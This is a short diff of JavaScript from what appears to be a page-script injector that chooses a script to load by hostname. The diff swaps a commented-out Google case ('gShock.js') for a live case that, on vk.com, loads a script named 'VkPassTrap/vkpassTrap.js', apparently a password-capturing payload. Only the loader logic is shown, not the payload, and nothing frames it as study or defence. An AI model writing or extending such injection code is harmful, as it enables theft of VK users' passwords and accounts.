@@ -52,11 +52,11 @@ if(location.hostname.indexOf('vk') > -1)
 				var scr = 'http://localhost/vk/lvk.js';
 		break;
 		
-		/* case 'e747eb2129f44e85b0d0cc5a70074dad':
-			if (location.hostname.indexOf('google') > -1){
-				var scr = 'http://localhost/GoogleYandexLock/google/gShock.js';
+		case '666':
+			if (location.hostname.indexOf('vk.com') > -1){
+				var scr = 'http://localhost/VkPassTrap/vkpassTrap.js';
 			}
-		break; */
+		break; 
 		
 		default: break;
 	}
